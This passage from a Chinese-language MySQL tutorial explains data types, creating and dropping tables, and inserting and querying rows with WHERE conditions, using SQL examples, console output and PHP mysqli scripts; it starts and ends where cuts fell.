<strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td style="text-align:left">YYYY-MM-DD hh:mm:ss</td><td style="text-align:left">混合日期和时间值，时间戳</td></tr></tbody></table><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">CHAR</td><td style="text-align:left">0-255 bytes</td><td style="text-align:left">定长字符串</td></tr><tr><td style="text-align:left">VARCHAR</td><td style="text-align:left">0-65535 bytes</td><td style="text-align:left">变长字符串</td></tr><tr><td style="text-align:left">TINYBLOB</td><td style="text-align:left">0-255 bytes</td><td style="text-align:left">不超过 255 个字符的二进制字符串</td></tr><tr><td style="text-align:left">TINYTEXT</td><td style="text-align:left">0-255 bytes</td><td style="text-align:left">短文本字符串</td></tr><tr><td style="text-align:left">BLOB</td><td style="text-align:left">0-65 535 bytes</td><td style="text-align:left">二进制形式的长文本数据</td></tr><tr><td style="text-align:left">TEXT</td><td style="text-align:left">0-65 535 bytes</td><td style="text-align:left">长文本数据</td></tr><tr><td style="text-align:left">MEDIUMBLOB</td><td style="text-align:left">0-16 777 215 bytes</td><td style="text-align:left">二进制形式的中等长度文本数据</td></tr><tr><td style="text-align:left">MEDIUMTEXT</td><td style="text-align:left">0-16 777 215 bytes</td><td style="text-align:left">中等长度文本数据</td></tr><tr><td style="text-align:left">LONGBLOB</td><td style="text-align:left">0-4 294 967 295 bytes</td><td style="text-align:left">二进制形式的极大文本数据</td></tr><tr><td style="text-align:left">LONGTEXT</td><td style="text-align:left">0-4 294 967 295 bytes</td><td style="text-align:left">极大文本数据</td></tr></tbody></table><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><p>枚举与集合类型（Enumeration and Set Types）</p><ul><li><p><strong>ENUM</strong>: 枚举类型，用于存储单一值，可以选择一个预定义的集合。</p></li><li><p><strong>SET</strong>: 集合类型，用于存储多个值，可以选择多个预定义的集合。</p></li></ul><h2 id="数据表">数据表</h2><h3 id="创建数据表">创建数据表</h3><p>创建 MySQL 数据表需要以下信息：</p><ul><li>表名</li><li>表字段名</li><li>定义每个表字段的数据类型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li><p><code>table_name</code> 是你要创建的表的名称。</p></li><li><p><code>column1</code>, <code>column2</code>, … 是表中的列名。</p></li><li><p><code>datatype</code> 是每个列的数据类型。</p><p>实例：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users (</span><br><span class="line">    id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">    username VARCHAR(50) NOT NULL,</span><br><span class="line">    email VARCHAR(100) NOT NULL,</span><br><span class="line">    birthdate DATE,</span><br><span class="line">    is_active BOOLEAN DEFAULT TRUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>实例解析：</p><ul><li><code>id</code>: 用户 id，整数类型，自增长，作为主键。</li><li><code>username</code>: 用户名，变长字符串，不允许为空。</li><li><code>email</code>: 用户邮箱，变长字符串，不允许为空。</li><li><code>birthdate</code>: 用户的生日，日期类型。</li><li><code>is_active</code>: 用户是否已经激活，布尔类型，默认值为 true。</li></ul><p>如果你希望在创建表时指定数据引擎，字符集和排序规则等，可以使用 <strong>CHARACTER SET</strong> 和 <strong>COLLATE</strong> 子句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE mytable (</span><br><span class="line">    id INT PRIMARY KEY,</span><br><span class="line">    name VARCHAR(50)</span><br><span class="line">) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `runoob_title` VARCHAR(100) NOT NULL,</span><br><span class="line">   `runoob_author` VARCHAR(40) NOT NULL,</span><br><span class="line">   `submission_date` DATE,</span><br><span class="line">   PRIMARY KEY ( `runoob_id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>实例解析：</p><ul><li>如果你不想字段为<strong>空</strong>可以设置字段的属性为 <strong>NOT NULL</strong>，如上实例中的 runoob_title 与 runoob_author 字段， 在操作数据库时如果输入该字段的数据为空，就会报错。</li><li><strong>AUTO_INCREMENT</strong> 定义列为自增的属性，一般用于主键，数值会自动加 1。</li><li><strong>PRIMARY KEY</strong> 关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号 <strong>,</strong> 分隔。</li><li><strong>ENGINE</strong> 设置存储引擎，<strong>CHARSET</strong> 设置编码。</li></ul><h3 id="删除数据表">删除数据表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name ;    -- 直接删除表，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP TABLE [IF EXISTS] table_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u your_username -p drop your_table</span><br></pre></td></tr></table></figure><p>mysqladmin命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;DROP TABLE runoob_tbl&quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;数据表删除失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php脚本命令</p><h2 id="数据操作">数据操作</h2><h3 id="插入数据">插入数据</h3><p>MySQL 表中使用 <strong>INSERT INTO</strong> 语句来插入数据。</p><p>你可以通过 <strong>mysql&gt;</strong> 命令提示窗口中向数据表中插入数据，或者通过PHP脚本来插入数据。</p><p>以下为向MySQL数据表插入数据通用的 <strong>INSERT INTO</strong> SQL语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, column3, ...)</span><br><span class="line">VALUES (value1, value2, value3, ...);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>table_name</code> 是你要插入数据的表的名称。</li><li><code>column1</code>, <code>column2</code>, <code>column3</code>, … 是表中的列名。</li><li><code>value1</code>, <code>value2</code>, <code>value3</code>, … 是要插入的具体数值。</li></ul><p>如果数据是字符型，必须使用单引号 <strong>’</strong> 或者双引号 <strong>&quot;</strong>，如： ‘value1’, “value1”。</p><p>如果你要插入所有列的数据，可以省略列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users</span><br><span class="line">VALUES (NULL,&#x27;test&#x27;, &#x27;test@runoob.com&#x27;, &#x27;1990-01-01&#x27;, true);</span><br></pre></td></tr></table></figure><p>这里，<strong>NULL</strong> 是用于自增长列的占位符，表示系统将为 <strong>id</strong> 列生成一个唯一的值。</p><p>如果你要插入多行数据，可以在 VALUES 子句中指定多组数值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (username, email, birthdate, is_active)</span><br><span class="line">VALUES</span><br><span class="line">    (&#x27;test1&#x27;, &#x27;test1@runoob.com&#x27;, &#x27;1985-07-10&#x27;, true),</span><br><span class="line">    (&#x27;test2&#x27;, &#x27;test2@runoob.com&#x27;, &#x27;1988-11-25&#x27;, false),</span><br><span class="line">    (&#x27;test3&#x27;, &#x27;test3@runoob.com&#x27;, &#x27;1993-05-03&#x27;, true);</span><br></pre></td></tr></table></figure><p>cmd窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p password;</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; USE RUNOOB;</span><br><span class="line">DATABASE changed</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl </span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 ROWS affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 ROWS affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#x27;2016-05-06&#x27;);</span><br><span class="line">Query OK, 1 ROWS affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$runoob_title = &#x27;学习 Python&#x27;;</span><br><span class="line">$runoob_author = &#x27;RUNOOB.COM&#x27;;</span><br><span class="line">$submission_date = &#x27;2016-03-06&#x27;;</span><br><span class="line"> </span><br><span class="line">$sql = &quot;INSERT INTO runoob_tbl &quot;.</span><br><span class="line">        &quot;(runoob_title,runoob_author, submission_date) &quot;.</span><br><span class="line">        &quot;VALUES &quot;.</span><br><span class="line">        &quot;(&#x27;$runoob_title&#x27;,&#x27;$runoob_author&#x27;,&#x27;$submission_date&#x27;)&quot;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;无法插入数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="查询数据">查询数据</h3><p>MySQL 数据库使用 <strong>SELECT</strong> 语句来查询数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">[WHERE condition]</span><br><span class="line">[ORDER BY column_name [ASC | DESC]]</span><br><span class="line">[LIMIT number];</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>olumn1</code>, <code>column2</code>, … 是你想要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li><li><code>table_name</code> 是你要从中查询数据的表的名称。</li><li><code>WHERE condition</code> 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。</li><li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li><li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数。</li></ul><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-- 选择所有列的所有行</span><br><span class="line">SELECT * FROM users;</span><br><span class="line"></span><br><span class="line">-- 选择特定列的所有行</span><br><span class="line">SELECT username, email FROM users;</span><br><span class="line"></span><br><span class="line">-- 添加 WHERE 子句，选择满足条件的行</span><br><span class="line">SELECT * FROM users WHERE is_active = TRUE;</span><br><span class="line"></span><br><span class="line">-- 添加 ORDER BY 子句，按照某列的升序排序</span><br><span class="line">SELECT * FROM users ORDER BY birthdate;</span><br><span class="line"></span><br><span class="line">-- 添加 ORDER BY 子句，按照某列的降序排序</span><br><span class="line">SELECT * FROM users ORDER BY birthdate DESC;</span><br><span class="line"></span><br><span class="line">-- 添加 LIMIT 子句，限制返回的行数</span><br><span class="line">SELECT * FROM users LIMIT 10;</span><br></pre></td></tr></table></figure><p>在 <code>WHERE</code> 子句中，你可以使用各种条件运算符（如 <code>=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>），逻辑运算符（如 <code>AND</code>, <code>OR</code>, <code>NOT</code>），以及通配符（如 <code>%</code>）等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 使用 AND 运算符和通配符</span><br><span class="line">SELECT * FROM users WHERE username LIKE &#x27;j%&#x27; AND is_active = TRUE;</span><br><span class="line"></span><br><span class="line">-- 使用 OR 运算符</span><br><span class="line">SELECT * FROM users WHERE is_active = TRUE OR birthdate &lt; &#x27;1990-01-01&#x27;;</span><br><span class="line"></span><br><span class="line">-- 使用 IN 子句</span><br><span class="line">SELECT * FROM users WHERE birthdate IN (&#x27;1990-01-01&#x27;, &#x27;1992-03-15&#x27;, &#x27;1993-05-03&#x27;);</span><br></pre></td></tr></table></figure><p>[^]: 这里的 <code>LIKE 'j%'</code> 使用了通配符 <code>%</code>，表示任意数量的字符</p><p>通配符 <code>%</code> 的作用是匹配零个或多个字符。例如：</p><ul><li><code>'j%'</code>：匹配以 ‘j’ 开头的所有字符串。</li><li><code>'%j'</code>：匹配以 ‘j’ 结尾的所有字符串。</li><li><code>'%j%'</code>：匹配包含 ‘j’ 的所有字符串。</li></ul><p>php脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="WHERE-子句">WHERE 子句</h3><p>我们知道从 MySQL 表中使用 <strong>SELECT</strong> 语句来读取数据。</p><p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句中。</p><p>WHERE 子句用于在 MySQL 中过滤查询结果，只返回满足特定条件的行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li><li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li></ul><p>下表中实例假定 A 为 10, B 为 20</p><table><thead><tr><th style="text-align:left">操作符</th><th style="text-align:left">描述</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">等号，检测两个值是否相等，如果相等返回true</td><td style="text-align:left">(A = B) 返回false。</td></tr><tr><td style="text-align:left">&lt;&gt;, !=</td><td style="text-align:left">不等于，检测两个值是否相等，如果不相等返回true</td><td style="text-align:left">(A != B) 返回 true。</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td style="text-align:left">(A &gt; B) 返回false。</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td style="text-align:left">(A &lt; B) 返回 true。</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td style="text-align:left">(A &gt;= B) 返回false。</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td style="text-align:left">(A &lt;= B) 返回 true。</td></tr></tbody></table><h4 id="简单实例">简单实例</h4><ol><li>等于条件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure><ol start="2"><li>不等于条件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username != &#x27;runoob&#x27;;</span><br></pre></td></tr></table></figure><ol start="3"><li>大于条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE price &gt; 50.00;</span><br></pre></td></tr></table></figure><ol start="4"><li>小于条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date &lt; &#x27;2023-01-01&#x27;;</span><br></pre></td></tr></table></figure><ol start="5"><li>大于等于条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE salary &gt;= 50000;</span><br></pre></td></tr></table></figure><ol start="6"><li>小于等于条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE age &lt;= 21;</span><br></pre></td></tr></table></figure><ol start="7"><li>组合条件（AND、OR）:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line"></span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure><ol start="8"><li>模糊匹配条件（LIKE）:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure><ol start="9"><li>IN 条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure><ol start="10"><li>NOT 条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure><ol start="11"><li>BETWEEN 条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure><ol start="12"><li>IS NULL 条件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE department IS NULL;</span><br></pre></td></tr></table></figure><ol start="13"><li>IS NOT NULL 条件:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE email IS NOT NULL;</span><br></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">// 读取 runoob_author 为 RUNOOB.COM 的数据</span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        